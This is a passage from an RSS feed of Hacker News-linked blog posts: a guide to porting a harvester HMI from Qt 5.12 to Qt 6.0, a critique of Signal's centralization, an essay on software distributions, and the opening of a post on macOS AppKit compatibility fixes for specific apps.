<p>The migration to Qt 6 is my 5th Qt migration. The migrations from Qt 1 to Qt 2, from Qt 2 to Qt 3 and from Qt 4 to Qt 5 were fairly smooth. The migration of an IDE for formal verification and of the driver terminal of a forage harvester were a matter of 2-3 days. The migration from Qt 3 to Qt 4 was extremely painful. Migrating an IDE for Bluetooth development took me 6 months. </p>



<p>I was curious how long I would need to migrate the driver terminal of a <a href="https://embeddeduse.com/2019/11/06/qt-controller-area-networks-talk-qtws19/">sugar beet harvester</a> from Qt 5.12 to Qt 6.0. The driver terminal has 350 source files (.cpp, .h, .qml) with 50K lines of hand-written code. It also has 45 source files with 74K lines of generated code for the terminal-machine communication. </p>



<p>The guide <a href="https://doc.qt.io/qt-6/portingguide.html">Porting to Qt 6</a> from the official Qt documentation is the starting point for the migration. It suggests to port the application to Qt 5.15 in a first step and to Qt 6.0 in a second step. The Qt developers made the APIs of Qt 5.15 as similar as possible to the APIs of Qt 6.0 to reduce the migration efforts.</p>



<p>I’ll describe step by step how to change the CMake files, how to fix the warnings and errors flagged by the C++ compiler, how to find the QML incompatibilities and how to set up the development environment for Qt 6.0.</p>



<h2>Migrating from Qt 5.12 to Qt 5.15</h2>



<p>The harvester application runs with Qt 5.12. We install Qt 5.15.2 and QtCreator 4.13 on our development PC. The PC should run Ubuntu 16.04 or newer.</p>



<h3>C++ Compiler Warnings and Errors</h3>



<p>The harvester application consists of three CMake projects: the executable <code>Main</code>, the library <code>Hmi</code> and the library <code>Can</code>. We switch on the deprecation warnings by adding the line</p>



<pre><code>target_compile_definitions(${PROJECT_NAME} PUBLIC 
    "QT_DISABLE_DEPRECATED_BEFORE=0x050F00")</code></pre>



<p>to the <code>CMakeLists.txt</code> of each project. This macro triggers a warning for every function that is deprecated in Qt 5.15 or older. Sometimes the use of a deprecated function causes an error. The next subsections list the C++ compiler warnings and errors I encountered while migrating the harvester application from Qt 5.12 to Qt 5.15.</p>



<p>The documentation page <a href="https://doc.qt.io/qt-5/obsoleteclasses.html">Obsolete Classes</a> lists all the classes that may be removed in future releases and all the classes with functions that may be removed in future releases. The documentation often gives a hint how to replace an obsolete class or function.</p>



<h4>Error/Warning: ‘endl’ is deprecated: Use Qt::endl</h4>



<p><em>Problem</em>:</p>



<pre><code>QTextStream os(&amp;dbFile);
os &lt;&lt; QStringLiteral("[access]") &lt;&lt; <strong>endl</strong>;</code></pre>



<p>Most occurrences of <code>endl</code> triggered the warning: <code>'endl' is deprecated: Use Qt::endl</code>. Some occurrences triggered an error: <code>‘endl’ was not declared in this scope</code>. The compiler couldn’t distinguish between <code>std::endl</code> and <code>Qt::endl</code>.</p>



<p><em>Fix</em>:</p>



<pre><code>QTextStream os(&amp;dbFile);</code>
os &lt;&lt; QStringLiteral("[access]") &lt;&lt; <strong>Qt::endl</strong>;</pre>



<p>We  replace each occurrence of <code>endl</code> by <code>Qt::endl</code>. All stream manipulators are now prefixed with the Qt namespace: for example, <code>Qt::hex</code>, <code>Qt::fixed</code>, <code>Qt::left</code> and <code>Qt::ws</code>.</p>



<h4>Error: ‘longMonthName’ is not a member of ‘QDate’</h4>



<p><em>Problem</em>:</p>



<pre>return QDate::longMonthName(i, <strong>QDate::StandaloneFormat</strong>);</pre>



<p>The static function <code>QDate::longMonthName</code> was removed from <code>QDate</code>.</p>



<p><em>Fix</em>: </p>



<pre id="block-e92f5df0-ab5d-4d07-8977-15b1a6d4d5b3">return QLocale().monthName(i);</pre>



<p>The documentation of <code>QDate::longMonthName</code> hints at <code>QLocale</code> for a replacement. <code>QLocale::monthName</code> returns the long month name by default.</p>



<h4>Error: no matching function for call to ‘QProcess::execute(const char [10])’</h4>



<p><em>Problem</em>:</p>



<pre><code>QProcess::execute(<strong>"/bin/sync"</strong>);</code></pre>



<p>The variant of <code>QProcess::execute</code> with the command as its only argument was removed.</p>



<p><em>Fix</em>:</p>



<pre><code>QProcess::execute(<strong>"/bin/sync", {}</strong>);</code></pre>



<p>We must always use the two-argument variant, where the second argument is a <code>QStringList</code> with the options and arguments of the command. As <code>sync</code> doesn’t have any arguments or options, the second argument is the empty list.</p>



<h4>Error: ‘mapped’ is not a member of ‘QSignalMapper’</h4>



<p><strong><em>Problem</em></strong>:</p>



<pre><code><strong>using MappedSignal = void(QSignalMapper::*)(int);</strong>
connect(&amp;m_impl-&gt;m_signalMapper, 
        <strong>static_cast&lt;MappedSignal&gt;(&amp;QSignalMapper::mapped)</strong>,
        m_impl.data(),
        &amp;DriverModel::Impl::onDriverChanged);</code></pre>



<p>Before Qt 5.15, <code>QSignalMapper::mapped</code> had an overload for each of the four types of the single argument: <code>QObject*</code>, <code>QWidget*</code>, <code>const QString&amp;</code> and <code>int</code>. We had to tell the compiler with a <code>static_cast</code> which overload to use in the connect statements. The overloads are obsolete in Qt 5.15.</p>



<p><em>Fix</em>:</p>



<pre><code>connect(&amp;m_impl-&gt;m_signalMapper, <strong>&amp;QSignalMapper::mappedInt</strong>,
        m_impl.data(), &amp;DriverModel::Impl::onDriverChanged);</code></pre>



<p>From Qt 5.15, the four overloads have different names <code>mappedInt</code>, <code>mappedObject</code>, <code>mappedString</code> and <code>mappedWidget</code>. This eliminates the cast and makes the code simpler.</p>



<h4>Error: no member named ‘insertMulti’ in ‘QMap &gt;’</h4>



<p><em>Problem</em>:</p>



<pre><code><strong>QMap</strong>&lt;int, std::function&lt;void()&gt;&gt; importCalls;
importCalls.<strong>insertMulti</strong>(0, [this, path](
    {m_customerModel.importCsvFile(path);});</code></pre>



<p>Before Qt 5.15, <code>QMap</code> distinguished between maps and multi-maps by <code>insert</code> and <code>insertMulti</code>.</p>



<p><em>Fix</em>:</p>



<pre><code><strong>QMultiMap</strong>&lt;int, std::function&lt;void()&gt;&gt; importCalls;
importCalls.<strong>insert</strong>(0, [this, path](
    {m_customerModel.importCsvFile(path);});</code></pre>



<p>Qt 5.15 introduces a new class <code>QMultiMap</code>, which inherits from <code>QMap</code>. We insert elements into a <code>QMultiMap</code> with <code>insert</code> now.</p>



<h4>Error/Warning: ‘QString::SplitBehavior’ has not been declared</h4>



<p><em>Problem</em>:</p>



<pre><code>auto nameParts = customer-&gt;name()
    .split(' ', <strong>QString::SkipEmptyParts</strong>);</code></pre>



<p>Like many other enum constants, <code>QString::SkipEmptyParts</code> was moved into the namespace <code>Qt</code>. The problem often occurs as a warning: </p>



<pre><code>‘... QString::split ...’ is deprecated: Use Qt::SplitBehavior variant instead [-Wdeprecated-declarations]</code></pre>



<p><em>Fix</em>:</p>



<pre><code>auto nameParts = customer-&gt;name()
    .split(' ', <strong>Qt::SkipEmptyParts</strong>);</code></pre>



<p>The warning tells us what to do. We replace <code>QString::SplitBehavior</code> by <code>Qt::SplitBehavior</code>.</p>



<h4>Error: call of overloaded ‘append()’ is ambiguous</h4>



<p><em>Problem</em>:</p>



<pre><code>QVector&lt;QPair&lt;QString, QString&gt;&gt; m_counterCats;
m_counterCats.<strong>append({"Gesamt", ""})</strong>;</code></pre>



<p><code>QVector&lt;T&gt;::append</code> has gained a third overload for rvalue references <code>T&amp;&amp;</code> in addition to the existing <code>const T&amp;</code> and <code>const QVector&lt;T&gt;&amp;</code>. The C++17 compiler cannot distinguish between these three overloads.</p>



<p><em>Fix</em>:</p>



<pre><code>QVector&lt;QPair&lt;QString, QString&gt;&gt; m_counterCats;
m_counterCats.<strong>append(QPair&lt;QString, QString&gt;{"Gesamt", ""});</strong></code></pre>



<p>We must help the C++17 compiler by spelling out the type of the appended element.</p>



<h3>QML Runtime Errors</h3>



<p>Unfortunately, we don’t have a friendly compiler telling us which lines of our QML code are deprecated. The documentation page <a href="https://doc.qt.io/qt-5/obsoleteqmltypes.html">Obsolete QML Types</a> lists the known obsolete types, properties and methods. It’s worth going through these lists and checking our QML code for problems. I didn’t find any problems in the harvester QML code.</p>



<p>Before we test the most common usage scenarios (hopefully in an automated way), we update the versions in the <code>import</code> statements. I had to perform the following replacements in the QML files.</p>



<pre><code><strong>Qt 5.12</strong>                      <strong>-&gt;  Qt 5.15</strong>
import QtQuick 2.10          -&gt;  import QtQuick 2.15
import QtQuick.Controls 2.3  -&gt;  import QtQuick.Controls 2.15
import QtMultimedia 5.8      -&gt;  import QtMultimedia 5.15</code></pre>



<p>In my case, testing the most common usage scenarios unearthed a single problem about signal handlers or slots in <code>Connections</code> types.</p>



<h4>Warning: QML Connections: Implicitly defined onFoo properties in Connections are deprecated</h4>



<p><em>Problem</em>:</p>



<pre><code>Connections {
    target: csvExportModel
    <strong>onMessageOccurred</strong>: messagePane.text = message
}</code></pre>



<p>The signal handler <code>onMessageOccurred</code> is implicitly defined as a function.</p>



<p><em>Fix</em>:</p>



<pre><code>Connections {
    target: csvExportModel
    <strong>function onMessageOccurred(message)</strong>
    {
        messagePane.text = message
    }
}</code></pre>



<p>We must define <code>onMessageOccurred</code> as a function explicitly with an argument list.</p>



<h2>Migrating from Qt 5.15 to Qt 6.0</h2>



<p>I installed QtCreator 4.14, as it is the first release that <a href="https://www.qt.io/blog/qt-creator-4.14-released">fully supports Qt 6</a>. QtCreator 4.14 adds proper syntax highlighting for Qt 6 code and some improvements for CMake. My development PC ran Ubuntu 18.04.</p>



<p>When I installed Qt 6.0 with the online installer, I encountered this error:</p>



<figure><a href="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?ssl=1"><img loading="lazy" width="500" height="294" src="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=500%2C294&amp;ssl=1" alt="" srcset="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?w=500&amp;ssl=1 500w, https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=300%2C176&amp;ssl=1 300w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?w=500&amp;ssl=1 500w, https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=300%2C176&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/embeddeduse.com/wp-content/uploads/2021/01/install-qt6-error-1.png?resize=500%2C294&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>



<p>My Internet search lead me to <a href="https://bugreports.qt.io/browse/QTBUG-89218">QTBUG-89218</a>. The comment section reveals that Ubuntu 18.04 is not a <a href="https://www.qt.io/blog/qt6-development-hosts-and-targets">supported development platform</a> any more. We have two options. We can upgrade to Ubuntu 20.04 or newer or we can build Qt 6.0 from sources. If our application uses one of the Qt modules not yet ported to Qt 6 (e.g., QtSerialBus, QtMultimedia, QtWebEngine), we will have to <a href="https://wiki.qt.io/Building_Qt_6_from_Git">build Qt 6.0 from sources</a> any way and port the missing module to Qt 6.0. I ended up doing both.</p>



<h3>Building with CMake</h3>



<h4>Updating CMakeLists.txt Files</h4>



<p>The <code>CMakeLists.txt</code> files refer to Qt 5 explicitly in <code>find_package</code> and <code>target_link_libraries</code> commands.</p>



<pre><code>find_package(<strong>Qt5</strong> COMPONENTS Core Gui Qml REQUIRED)
target_link_libraries(${PROJECT_NAME}
  Ag::Can Ag::Hmi <strong>Qt5</strong>::Core <strong>Qt5</strong>::Gui <strong>Qt5</strong>::Qml
)</code></pre>



<p>We must change Qt 5 to Qt 6.</p>



<pre><code>find_package(<strong>Qt6</strong> COMPONENTS Core Gui Qml REQUIRED)
target_link_libraries(${PROJECT_NAME}
  Ag::Can Ag::Hmi <strong>Qt6</strong>::Core <strong>Qt6</strong>::Gui <strong>Qt6</strong>::Qml
)</code></pre>



<p>Qt5 was built on C++11. The top-level <code>CMakeLists.txt</code> file contained the following lines.</p>



<pre><code>set(CMAKE_CXX_STANDARD <strong>11</strong>)
set(CMAKE_CXX_STANDARD_REQUIRED ON)</code></pre>



<p>Qt6 requires C++17. We must change the top-level <code>CMakeLists.txt</code> file accordingly.</p>



<pre><code>set(CMAKE_CXX_STANDARD <strong>17</strong>)
set(CMAKE_CXX_STANDARD_REQUIRED ON)</code></pre>



<h4>Setting Up the QtCreator Kit</h4>



<p>When I started QtCreator 4.14 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/">https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/</a></em></p>]]>
            </description>
            <link>https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811697</guid>
            <pubDate>Sun, 17 Jan 2021 15:56:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We can do better than Signal]]>
            </title>
            <description>
<![CDATA[
Score 168 | Comments 278 (<a href="https://news.ycombinator.com/item?id=25811696">thread link</a>) | @icy
<br/>
January 17, 2021 | https://icyphox.sh/blog/signal/ | <a href="https://web.archive.org/web/*/https://icyphox.sh/blog/signal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <header>
            <section>
<a href="https://icyphox.sh/">
<img src="https://d33wubrfki0l68.cloudfront.net/f294b31af19b6fafcede07b76eac214e9a381be7/5c724/static/white.svg" alt="icyphox's avatar">
</a>
</section>

          </header>
          <!--<section style="float: right">
            view in <a href="/txt/signal.txt">plain-text</a>
          </section>-->
          <section>
            17 January, 2021
          </section>
          <article>
            
            <h2>Centralized silos are never the solution</h2>
            <p>Signal is possibly the most recommended pro-privacy instant
communication app — one that was commonplace in the hacker community,
and has now gained a lot of mainstream traction, thanks to WhatsApp
deciding to screw its userbase over. It certainly presents a more
compelling alternative than others in the same space, like WhatsApp
itself, Telegram, etc. They engineered the <a href="https://en.wikipedia.org/wiki/Signal_Protocol" rel="nofollow">Signal
Protocol</a>, which has
found its way into other messaging systems, and has been the base for
the likes of OMEMO and Matrix.<sup id="fnref:1"><a href="#fn:1">1</a></sup> While I admire the tech behind
Signal, I still believe we can do better, and we ought to.</p>

<p>I have a few gripes with Signal — the biggest of them all is it’s
centralized, and in the US no less. This alone makes it not that
different from WhatsApp — we’re simply moving from one silo to another.
What’s to say that Signal will uphold its values, continue operating
<em>and</em> evade censorship and potential compromise? To top it off, they’re
becoming a fairly high value target off late. And if that isn’t
convincing enough, Signal’s massive outage lasting nearly a day<sup id="fnref:2"><a href="#fn:2">2</a></sup>
should be enough evidence against centralization. Further, Signal is
known to use AWS<sup id="fnref:3"><a href="#fn:3">3</a></sup> as their cloud provider — what if another
Parler<sup id="fnref:4"><a href="#fn:4">4</a></sup> happens and the rug is pulled from under Signal’s feet?</p>

<p>A common defense in favor of Signal is, “But it’s all open source!”.
Sure is, but on what basis do I trust them? I don’t mean to sound
conspiratorial, but what’s to say that the server in production hasn’t
been backdoored? In fact, the <a href="https://github.com/signalapp/Signal-Server" rel="nofollow">Signal server
code</a> hasn’t even been
updated since April 2020. You’re telling me it’s undergone <em>no</em> changes?</p>

<p>Another response I usually see is “But Signal is all we have!”. While
that is somewhat true — at least by the metric of “secure messengers
your granny can use”, there are some promising alternatives who are
especially focused on decentralizing E2EE communications.</p>

<ol>
<li><a href="https://matrix.org/" rel="nofollow">Matrix</a>: Matrix has improved a whole lot, and I
like that they’re working to disprove that end-to-end encryption
cannot be decentralized<sup id="fnref:5"><a href="#fn:5">5</a></sup>.</li>
<li><a href="https://getsession.org/" rel="nofollow">Session</a>: While it involves some cryptoshit,
and hasn’t been verified yet, it’s an interesting alternative to keep
an eye out for.</li>
</ol>

<p>All things said, Signal is the shiniest turd we have — it fits most
threat models, and does the job alright; I will continue to use it.
However, here’s something to think about: while privacy preserving tech
is commendable, does it have to come at the cost of user freedoms? Hint:
it doesn’t, and it shouldn’t.</p>


 
          </article>
          <p>Questions or comments? 
          Send an email to 
          <a href="mailto:~icyphox/x@lists.sr.ht?Subject=Re:%20We%20can%20do%20better%20than%20Signal">~icyphox/x@lists.sr.ht</a>—my <a href="https://lists.sr.ht/~icyphox/x">public inbox</a>.</p>
        </div></div>]]>
            </description>
            <link>https://icyphox.sh/blog/signal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811696</guid>
            <pubDate>Sun, 17 Jan 2021 15:55:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Distributions and Their Roles Today]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25811596">thread link</a>) | @nwotnagrom
<br/>
January 17, 2021 | https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html | <a href="https://web.archive.org/web/*/https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    <p><img src="https://venam.nixers.net/blog/assets/mailroom.jpg" alt="Mailroom" loading="lazy"></p>

<p><em>NB</em>: This is a repost on this blog of a post made on <a href="https://nixers.net/showthread.php?tid=2192">nixers.net</a></p>

<h2 id="what-is-a-distribution">What is a distribution</h2>

<p>What are software distributions? You may think you know everything there
is to know about the term software distribution, but take a moment to
think about it, take a step back and try to see the big picture.</p>

<p>We often have in mind the thousands of Linux distributions when we hear
it, however, this is far from limited to Linux, BSD, Berkeley Software
Distribution, has software distribution right in the name. Android,
and iOS are software distributions too.</p>

<p>Actually, it’s so prevalent, we may have stopped paying attention to
the concept. We find it hard to put a definition together.<br>
There’s definitely the part about distributing software in it. Software
that may be commercial or not, open source or not.<br>
To understand it better maybe investigating what problems software
distributions address would clear things up.</p>

<p>Let’s imagine a world before software distributions, does that world
exist? A world where software stays within boundaries, not shared with anyone
outside.<br>
Once we break these boundaries, and we want to share it, we’ll find that we
have to package all the software together meaningfully, configure
them so that they work well together, adding some glue in between when
necessary, find the appropriate medium to distribute the bundle, get
it all from one end to another safely, make sure it installs properly,
and follow up on it.</p>

<p>Thus, software distribution is about the mechanism and the community
that takes the burden and decisions to build an assemblage of coherent
software that can be shipped.</p>

<p>The operating system, or kernel if you like, could be, and is often,
part of the collage offered, a software just like others.</p>

<p>The people behind it are called distribution maintainers, or package
maintainers. Their role vary widely, they could write the software that
stores all the packages called the repository, maintain a package manager
with its format, maintain a full operating system installer, package and
upload software they built or that someone else built on a specific time
frame/life cycle, make sure there aren’t any malicious code uploaded on
the repository, follow up on the latest security issues and bug reports,
fix third party software to fit the distribution philosophical choices
and configurations, and most importantly test, plan, and make sure
everything holds up together.<br>
These maintainers are the source of trust of the distribution, they
take responsibility for it. In fact, I think it’s more accurate to call
them distributors.</p>

<ul>
  <li><a href="#target-and-speciality">Target And Speciality</a></li>
  <li><a href="#the-layering">The Layering</a></li>
  <li><a href="#stable-releases-vs-rolling">Releases vs Rolling</a></li>
  <li><a href="#interdistribution-standard">Interdistribution Standard</a></li>
  <li><a href="#method-of-distribution">Medthod of Distribution</a></li>
  <li><a href="#format">Packages Format</a></li>
  <li><a href="#resolving-dependencies">Resolving Dependencies</a></li>
  <li><a href="#versioning">Versioning</a></li>
  <li><a href="#static-vs-dynamic-linking">Static vs Dynamic Linking</a></li>
  <li><a href="#reproducibility">Reproducibility</a></li>
  <li><a href="#stateless-and-verifiable-systems">Stateless and Verifiable Systems</a></li>
  <li><a href="#do-distros-matter-with-containers-virtualisation-and-specific-and-universal-package-managers">Do Distros Matter With Containers, Virtualisation, and Specific and Universal Package Managers</a></li>
  <li><a href="#if-packages-are-self-contained">If Packages Are Self-Contained</a></li>
  <li><a href="#programming-language-package-management-specific">Programming language package management specific</a></li>
  <li><a href="#going-distro-less">Going Distro-less</a></li>
</ul>

<h2 id="different-ways-to-approach-it">Different ways to approach it</h2>

<p>There’s so many distributions it can make your head spin. The software
world is booming, especially the open source one. For instance, we can
find bifurcations of distributions that get copied by new maintainers
and divert. This creates a tree like aspect, a genealogy of both common
ancestors and/or influences in technical and philosophical choices.<br>
Overall, we now have a vibrant ecosystem where a thing learned on a
branch can help a completely unrelated leaf on another tree. There’s
something for everyone.</p>

<h3 id="target-and-speciality">Target and speciality</h3>

<p>So what could be so different between all those software distributions,
why not have a single platform that everyone can build on.</p>

<p>One thing is specialization and differentiation. Each distro caters to
a different audience and is built by a community with its philosophy.</p>

<p>Let’s go over some of them:</p>

<ul>
  <li>A distribution can support specific sets and combinations of hardware:
from CPU ISA to peripherals drivers</li>
  <li>A distribution may be specifically optimized for a type of environment:
Be it desktop, portable mobile device, servers, warehouse size computers,
embedded devices, virtualised environment, etc.</li>
  <li>A distribution can be commercially backed or not</li>
  <li>A distribution can be designed for different levels of knowledge in a
domain, professional or not. For instance, security research, scientific
computing, music production, multimedia box, HUD in cars, mobile device
interface, etc.</li>
  <li>A distribution might have been certified to follow certain standards
that need to be adhered to in professional settings, for example security
standards and hardening</li>
  <li>A distribution may have a single purpose in a commodity machine,
specific machine functionalities such as firewall, a computer cluster,
a router, etc.</li>
</ul>

<p>That all comes to the raison d’être, the philosophy of the distribution,
it guides every decision the maintainers have to make. It guides how they
configure every software, how they think about security, portability,
comprehensiveness.</p>

<p>For example, if a distribution cares about free software, it’s going to
be strict about what software it includes and what licenses it allows
in its repository, having software to check the consistency of licenses
in the core.<br>
Another example is if their goal is to target a desktop audience then
internationalization, ease of use, user-friendliness, numerous
packages, is going to be prioritized. While, again, if the
target is a real time embedded device, the size of the kernel is going
to be small, configured and optimized for this purpose, and limiting and
choosing the appropriate packages that work in this environment. Or if
it’s targeted at advanced users that love having control of their machine,
the maintainers will choose to let the users make most of the decisions,
providing as many packages as possible with the latest version possible,
with a loose way to install the distribution, having a lot of libraries
and software development tools.</p>

<p>What this means is that a distribution does anything it can to provide
sane defaults that fit its mindset. It composes and configures a layer
of components, a stack of software.</p>

<h3 id="the-layering">The layering</h3>

<p>Distribution maintainers often have at their disposition different blocks
and the ability to choose them, stacking them to create a unit we call a
software distribution. There’s a range of approaches to this, they could
choose to have more, or less, included in what they consider the <em>core</em> of
the distribution and what is externally less important to it.<br>
Moreover, sometimes they might even leave the core very small and loose,
instead providing the glue software that makes it easy for the users
to choose and swap the blocks at specific stages in time: installation,
run time, maintenance mode, etc.</p>

<p>So what are those blocks of interdependent components.</p>

<p>The first part is the method of installation, this is what everything
hinges on, the starting point.</p>

<p>The second part is the kernel, the real core of all operating systems
today. But that doesn’t mean that the distribution has to enforce
it. Some distributions may go as far as to provide multiple kernels
specialised in different things or none at all.</p>

<p>The third part is the filesystem and file hierarchy, the component that
manages where and how files are spread out on the physical or virtual
hardware. This could be a mix and match where sections of the file system
tree are stored on separate filesystems.</p>

<p>The fourth part is the init system, PID 1. This choice has generated
a lot of contention these days. PID 1 being the mother process of all
other processes on the system. What role it has and what functionalities
it should include is a subject of debate.</p>

<p>The fifth part is composed of the shell utilities, what we sometimes
refer to as the userland or user space, as it’s the first layer the user
can directly interface with to have control of the operating system, the
place where processes run. The userland implementations on Unix-based
systems usually tries to follow the POSIX standard. There are many such
implementations, also subject of contention.</p>

<p>The sixth part is made up of services and their management. The daemons,
long-running processes that keep the system in order. Many argue if the
management functionality should be part of the init system or not.</p>

<p>The seventh part is documentation. Often it is forgotten but it is still
very important.</p>

<p>The last part is about everything else, all the user interfaces and
utilities a user can have and ways to manage them on the system.</p>

<h3 id="stable-releases-vs-rolling">Stable releases vs Rolling</h3>

<p>There exists a spectrum on which distributions place themselves when
it comes to keeping up to date with the versions of the software they
provide. This most often applies to external third party open source
software.<br>
The spectrum is the following: Do we allow the users to always have the
latest version of every software while running the risk of accidentally
breaking their system, what we call bleeding edge or rolling distro, or
do we take a more conservative approach and take the time to test every
software properly before allowing it in the repository, while not having
all the latest updates, features, and optimizations of the software,
what we call release based distro.</p>

<p><strong>NB</strong>: Keep in mind that this isn’t about the software version from the
developer’s perspective but the upstream/packaged software version from
the maintainers’ perspective. The distinction lies in the selection that
package maintainers make: will their upstream changes directly affect
all users and changes “roll” downstream, or are users able to select
between multiple upstreams sources/releases. We take the eyes of the
maintainers here.</p>

<p>The extreme of the first scenario would be to let users directly download
from the software vendor/creator source code repository, or the opposite,
let the software vendor/creator push directly to the distribution
repository. Which could easily break or conflict with the user’s system
or lead to security vulnerability. …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html">https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html</a></em></p>]]>
            </description>
            <link>https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811596</guid>
            <pubDate>Sun, 17 Jan 2021 15:45:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[299 macOS apps are so buggy, Apple had to fix them in AppKit (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25811460">thread link</a>) | @xoa
<br/>
January 17, 2021 | https://worthdoingbadly.com/appkitcompat/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/appkitcompat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>What do Photoshop, Matlab, Panic Transmit, and Eclipse have in common? They are among the 299 apps for which macOS applies compatibillity fixes.</p>

<p>Here’s the <a href="https://worthdoingbadly.com/assets/blog/appkitcompat/appkit_processed.html">full list of bundle IDs</a>, along with the functions that checks for them, and the first caller to those functions. It’s also available in <a href="https://worthdoingbadly.com/assets/blog/appkitcompat/appkit.csv">CSV format</a>.</p>

<p>Note that this is just a list of apps Apple has developed compatibility tweaks to make them run on newer macOS versions. As the list demonstrates, even the best apps often needs some tweaks on newer macOS. In addition, most of these patches are only applied to older versions of apps.</p>

<p>Here’s how I extracted the list, and some interesting things I found in it.</p>

<h2 id="how-i-learned-about-this">How I learned about this</h2>

<p>While browsing <a href="https://twitter.com/stroughtonsmith">@stroughtonsmith</a>’s Twitter feed, I saw this tweet from <a href="https://twitter.com/b3ll">@b3ll</a>:</p>

<blockquote>
  <p>You know you’ve really made it when NSImage explicitly checks for your bundle</p>

  <p><img src="https://worthdoingbadly.com/assets/blog/appkitcompat/b3ll_tweet.jpg" width="560"></p>

  <p>Adam Bell (@b3ll), <a href="https://twitter.com/b3ll/status/994665524448583682">May 10, 2018</a></p>
</blockquote>

<p>This was interesting: I always thought that Apple was not as thorough about compatibility as Microsoft. But a later reply dropped an even crazier tidbit:</p>

<blockquote>
  <p>AppKit has hundreds of bundle ID checks for various reasons</p>

  <p>Guilherme Rambo (@_inside), <a href="https://twitter.com/_inside/status/994669723731275777">May 10, 2018</a></p>
</blockquote>

<p>Hundreds? I gotta take a look at this.</p>

<p>Others, such as <a href="https://twitter.com/0xced">0xced</a> had <a href="https://twitter.com/0xced/status/429727057594290176">asked about this</a> before: it turns out Apple calls them <a href="https://twitter.com/LegNeato/status/429885180275208192">“checkfixes”</a> internally.</p>

<h2 id="which-apps">Which apps?</h2>

<p>Compatibility fixes are applied by checking the</p>

<p><code>bool __CFAppVersionCheckLessThan(CFStringRef, CFSystemVersion)</code></p>

<p>function, which returns true if the current app matches the specified bundle ID and is linked on or prior to the macOS version. Thus, older versions of the app would have the fix applied, while newer versions built with a newer SDK would not.</p>

<p>I found 299 unique app IDs passed into <code>__CFAppVersionCheckLessThan</code> by statically analyzing AppKit, Foundation, and CoreFoundation on macOS 10.13.4.</p>

<p>Apple itself tops the list with 64 unique app IDs: this is expected, since Apple likely used tricks and private APIs third parties couldn’t use, causing compatibility issues down the line.</p>

<p>Adobe, of course, is second place with 31 bundle IDs.</p>

<p>Looking through the list of apps tells a lot about what apps Apple considers essential to the Mac platform: after all, they put special effort to make them work on newer system versions. So what apps do Apple consider important?</p>

<p>Productivity apps from large companies:</p>
<ul>
  <li>most of the Adobe suite</li>
  <li>the Microsoft Office suite</li>
  <li>Autodesk’s AutoCAD and Maya</li>
  <li>Matlab</li>
  <li>Ableton Live</li>
  <li>Intuit Quicken/QuickBooks</li>
  <li>TurboCAD</li>
  <li>VMWare Fusion</li>
</ul>

<p>Communication apps:</p>
<ul>
  <li>Google Chrome</li>
  <li>Opera Browser</li>
  <li>Twitter for Mac</li>
  <li>Tencent QQ, WeChat</li>
  <li>AOL Messenger</li>
  <li>Citrix GoToMeeting</li>
  <li>Cisco Spark</li>
  <li>HipChat</li>
  <li>Sketch</li>
  <li>Spotify</li>
  <li>Evernote</li>
  <li>Dropbox</li>
</ul>

<p>Surprisingly high number of games. I suspect there are even more IDs in game-specific libraries such as OpenGL.</p>
<ul>
  <li>Blizzard’s games: installer, Diablo 3, Heroes of the Storm, Starcraft 2, World of Warcraft, Hearthstone, and Battle.NET</li>
  <li>Grid 2 Reloaded</li>
  <li>Dragon Age 2 (of course)</li>
</ul>

<p>Open-source apps:</p>
<ul>
  <li>Firefox</li>
  <li>VLC</li>
  <li>Blender</li>
  <li>Eclipse</li>
  <li>AquaMacs (an Emacs port)</li>
  <li>OpenJDK</li>
  <li>Textual IRC</li>
</ul>

<p>Indie favorites:</p>
<ul>
  <li>Panic’s Coda and Transmit</li>
  <li>Omni Group’s OmniFocus, OmniGraffle, OmniPlan, and OmniWeb</li>
  <li>Sketch</li>
  <li>1Password</li>
  <li>BBEdit/TextWrangler</li>
</ul>

<p>Device drivers, because the manufacturers ain’t gonna fix ‘em</p>
<ul>
  <li>Garmin TrainingCenter</li>
  <li>Epson xp640</li>
  <li>HP Installer</li>
